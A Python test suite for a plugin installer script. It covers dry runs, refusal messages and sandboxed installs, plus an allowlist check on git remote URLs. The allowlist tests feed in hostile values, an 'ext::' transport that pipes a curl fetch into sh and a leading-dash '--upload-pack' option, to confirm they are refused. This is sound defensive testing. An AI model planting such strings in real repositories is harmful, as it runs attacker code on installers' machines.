"""tools/install.py, driven directly (never through the install.sh shim, that
is tools/test_sbe_install.py's job).

Every scenario here runs against a throwaway HOME and target directory, never
against this checkout. No network call ever reaches the real internet:
install_plugin()'s `git ls-remote` / `git clone` / `git -C ... pull` are the
one seam tools/install.py cannot avoid reaching for a real (non dry-run)
install, and they are stubbed exactly like tools/test_sbe_install.py already
stubs them. That seam is NO-DATA in this suite, not silently assumed to work:
nothing here proves the real GitHub marketplace path.
"""
import io
import json
import os
import shutil
import subprocess
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
INSTALL_PY = os.path.join(ROOT, "tools", "install.py")


def _resolve(path):
    """The same `cd "$1" && pwd` resolution install.py's own _shell_resolve
    performs, so a test's expectation is computed the identical way."""
    out = subprocess.run(["sh", "-c", 'cd "$1" && pwd', "sh", path],
                          capture_output=True, text=True, check=True)
    return out.stdout.strip()


class TestInstallPy(unittest.TestCase):
    def _run(self, *argv, **kw):
        env = dict(os.environ)
        env.update(kw.get("env", {}))
        cwd = kw.get("cwd")
        out = subprocess.run(["python3", INSTALL_PY] + list(argv),
                              capture_output=True, text=True, env=env,
                              cwd=cwd, timeout=120)
        return out.returncode, out.stdout, out.stderr

    def _stub_bin(self, tmp, *names):
        for name in names:
            path = os.path.join(tmp, name)
            with io.open(path, "w", encoding="utf-8") as fh:
                fh.write("#!/bin/sh\nexit 0\n")
            os.chmod(path, 0o755)
        return tmp + os.pathsep + os.environ.get("PATH", "")

    def _scratch_target(self, tmp, name="project"):
        path = os.path.join(tmp, name)
        os.makedirs(path)
        return path

    # -- fresh install (dry run: proves every step, writes nothing) -----

    def test_dry_run_names_every_step_and_writes_nothing(self):
        tmp = tempfile.mkdtemp()
        try:
            scratch = self._scratch_target(tmp)
            code, stdout, _ = self._run(
                "--dry-run", "--target", scratch,
                env={"PATH": self._stub_bin(tmp, "claude")})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(code, 0, stdout)
        for step in ("git", "python3", "claude", "team profile", "doctor"):
            self.assertIn(step, stdout)
        self.assertIn("install: dry run, nothing written.", stdout)

    # -- refusal: no --target and no directory named --------------------

    def test_a_missing_target_directory_is_named_with_its_remedy(self):
        tmp = tempfile.mkdtemp()
        try:
            missing = os.path.join(tmp, "does-not-exist")
            code, stdout, _ = self._run("--dry-run", "--target", missing)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(code, 2, stdout)
        self.assertIn("MISSING target", stdout)
        self.assertIn(missing, stdout)

    # -- refusal: the distribution directory itself ----------------------

    def test_the_distribution_directory_is_refused_without_developer_self_test(self):
        code, stdout, _ = self._run("--dry-run", "--target", ROOT)
        self.assertEqual(code, 1, stdout)
        self.assertIn("REFUSED", stdout)
        self.assertIn(_resolve(ROOT), stdout)
        self.assertIn("--developer-self-test", stdout)

    def test_the_distribution_directory_refusal_is_bypassed_with_developer_self_test(self):
        tmp = tempfile.mkdtemp()
        try:
            code, stdout, _ = self._run(
                "--dry-run", "--target", ROOT, "--developer-self-test",
                env={"PATH": self._stub_bin(tmp, "claude")})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(code, 0, stdout)
        self.assertNotIn("REFUSED", stdout)

    # -- BACKWARDS DRIVE: break a precondition, watch the named refusal --

    def test_a_missing_prerequisite_is_named_with_its_remedy(self):
        """Precondition broken on purpose (SBE_INSTALL_REQUIRE names a tool
        that does not exist on PATH), instead of the refusal being asserted
        from reading the source: the run must actually name the missing tool
        and exit nonzero."""
        tmp = tempfile.mkdtemp()
        try:
            scratch = self._scratch_target(tmp)
            code, stdout, _ = self._run(
                "--dry-run", "--target", scratch,
                env={"PATH": "/usr/bin:/bin",
                     "SBE_INSTALL_REQUIRE": "definitely-absent-tool"})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(code, 1, stdout)
        self.assertIn("MISSING definitely-absent-tool", stdout)

    def test_a_dry_run_without_the_claude_cli_refuses_by_name(self):
        tmp = tempfile.mkdtemp()
        try:
            scratch = self._scratch_target(tmp)
            self._stub_bin(tmp, "git")
            code, stdout, _ = self._run(
                "--dry-run", "--target", scratch,
                env={"PATH": tmp + os.pathsep + "/usr/bin:/bin"})
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        self.assertEqual(code, 1, stdout)
        self.assertIn("MISSING claude", stdout)

    def test_target_requires_an_argument(self):
        code, stdout, _ = self._run("--target")
        self.assertEqual(code, 2, stdout)
        self.assertIn("--target requires a path argument", stdout)


class TestInstallPyRealRun(unittest.TestCase):
    """A real (non dry-run) install.py, sandboxed exactly the way
    tools/test_sbe_install.py's TestSandboxedRealInstall sandboxes install.sh:
    a stubbed `claude` and a `git` that answers only the network-touching
    subcommands locally, HOME pointed at a disposable directory. Proves a
    fresh install and a re-install over an existing one, both against
    install.py, never against the shim."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _stub_claude(self, bindir, log_path):
        path = os.path.join(bindir, "claude")
        with io.open(path, "w", encoding="utf-8") as fh:
            fh.write("#!/bin/sh\n"
                      "printf '%s\\n' \"$@\" >> \"$SBE_TEST_CLAUDE_LOG\"\n"
                      "printf -- '--END--\\n' >> \"$SBE_TEST_CLAUDE_LOG\"\n"
                      "exit 0\n")
        os.chmod(path, 0o755)
        return log_path

    def _stub_git(self, bindir, real_git, clone_source):
        """Answers install.py's three network-touching calls locally, the
        NO-DATA seam this suite names in its module docstring: `ls-remote`
        empty (clone fallback taken), `clone` as a real local copy of
        clone_source, `-C ... pull` a no-op. Every other subcommand execs
        the real git, so bin/sbe doctor's own git calls against $TARGET are
        answered for real."""
        path = os.path.join(bindir, "git")
        with io.open(path, "w", encoding="utf-8") as fh:
            fh.write(
                "#!/bin/sh\n"
                "case \"$1\" in\n"
                "    ls-remote)\n"
                "        exit 0\n"
                "        ;;\n"
                "    clone)\n"
                "        dest=$3\n"
                "        mkdir -p \"$dest\"\n"
                "        cp -R \"$SBE_TEST_GIT_CLONE_SOURCE\"/. \"$dest\"/\n"
                "        rm -rf \"$dest/.git\"\n"
                "        exit 0\n"
                "        ;;\n"
                "    -C)\n"
                "        exit 0\n"
                "        ;;\n"
                "    *)\n"
                "        exec \"%s\" \"$@\"\n"
                "        ;;\n"
                "esac\n" % real_git)
        os.chmod(path, 0o755)

    def _sandbox(self):
        bindir = os.path.join(self.tmp, "bin")
        os.makedirs(bindir, exist_ok=True)
        home = os.path.join(self.tmp, "home")
        os.makedirs(home, exist_ok=True)
        claude_log = os.path.join(self.tmp, "claude.log")
        real_git = shutil.which("git", path="/usr/bin:/bin") or shutil.which("git")
        self.assertIsNotNone(real_git, "this test needs a real git reachable")
        self._stub_claude(bindir, claude_log)
        self._stub_git(bindir, real_git, ROOT)
        return bindir, home, claude_log

    def _scratch_target(self, name="project"):
        target = os.path.join(self.tmp, name)
        os.makedirs(target)
        subprocess.run(["git", "init", "-q"], cwd=target, check=True)
        subprocess.run(["git", "config", "user.email", "fixture@fixture.test"],
                        cwd=target, check=True)
        subprocess.run(["git", "config", "user.name", "Fixture"],
                        cwd=target, check=True)
        return target

    def _real_install(self, target):
        bindir, home, claude_log = self._sandbox()
        env = dict(os.environ)
        env.pop("SBE_INSTALL_REQUIRE", None)
        env["PATH"] = bindir + os.pathsep + "/usr/bin:/bin"
        env["HOME"] = home
        env["SBE_TEST_CLAUDE_LOG"] = claude_log
        env["SBE_TEST_GIT_CLONE_SOURCE"] = ROOT
        out = subprocess.run(["python3", INSTALL_PY, "--target", target],
                              capture_output=True, text=True, env=env, timeout=180)
        return out.returncode, out.stdout, out.stderr

    def test_a_fresh_install_writes_the_local_footprint_and_passes_doctor(self):
        target = self._scratch_target(name="fresh")
        code, stdout, stderr = self._real_install(target)
        self.assertEqual(code, 0, stdout + stderr)
        self.assertTrue(os.path.exists(os.path.join(target, ".brothersbe", "config.json")),
                         stdout)
        self.assertIn("install: PASS, sbe doctor agrees (graded %s)" % _resolve(target),
                       stdout, stdout)

    def test_a_reinstall_over_an_existing_target_is_idempotent(self):
        target = self._scratch_target(name="reinstall")
        code1, stdout1, stderr1 = self._real_install(target)
        self.assertEqual(code1, 0, stdout1 + stderr1)
        with io.open(os.path.join(target, ".brothersbe", "config.json"),
                     encoding="utf-8") as fh:
            before = fh.read()

        code2, stdout2, stderr2 = self._real_install(target)
        self.assertEqual(code2, 0, stdout2 + stderr2)
        self.assertIn("install: files written: none", stdout2, stdout2)
        with io.open(os.path.join(target, ".brothersbe", "config.json"),
                     encoding="utf-8") as fh:
            after = fh.read()
        self.assertEqual(before, after,
                          "a second install over the same target rewrote config.json")


class TestOriginUrlIsAllowlisted(unittest.TestCase):
    """Security review 2026-09-04, Major: remote.origin.url is read out of
    git config and handed straight to `git clone`, `git ls-remote` and
    `claude plugin marketplace add`. A clone can carry any string there, and
    two shapes turn that into somebody else's code running on the machine of
    whoever ran install.sh: git's `ext::` transport runs its argument as a
    shell command, and a leading `-` is read as an option by whatever runs
    next. Driven both ways: the shapes that must be refused, and the
    ordinary remotes that must keep working."""

    def setUp(self):
        # Imported here rather than at module scope: every other case in this
        # file drives install.py as a subprocess on purpose, and this is the
        # only one that needs the function itself.
        import importlib.util
        spec = importlib.util.spec_from_file_location("_sbe_install",
                                                      INSTALL_PY)
        self.install = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.install)

    def _refused(self, url):
        ok, reason = self.install.check_origin_url(url)
        self.assertFalse(ok, "%r was allowed through" % url)
        self.assertTrue(reason, "a refusal with no reason is not a refusal")
        return reason

    def test_the_ext_transport_is_refused_and_the_reason_names_it(self):
        reason = self._refused("ext::sh -c 'curl example.invalid | sh'")
        self.assertIn("ext::", reason)

    def test_a_leading_dash_is_refused_and_the_reason_says_why(self):
        reason = self._refused("--upload-pack=/tmp/payload")
        self.assertIn("option", reason)

    def test_other_shapes_that_are_not_repository_addresses_are_refused(self):
        for url in ("file:///etc", "ftp://host/repo.git", "",
                    "../../elsewhere", "-"):
            self._refused(url)

    def test_the_ordinary_remotes_every_host_prints_are_allowed(self):
        for url in ("https://github.com/owner/repo.git",
                    "https://bitbucket.org/workspace/repo.git",
                    "ssh://git@github.com/owner/repo.git",
                    "git://host/repo.git",
                    "git@github.com:owner/repo.git",
                    "git@bitbucket.org:workspace/repo.git",
                    "/Users/someone/checkouts/repo"):
            ok, reason = self.install.check_origin_url(url)
            self.assertTrue(ok, "%r was refused: %s" % (url, reason))
            self.assertIsNone(reason)


if __name__ == "__main__":
    unittest.main(verbosity=2)
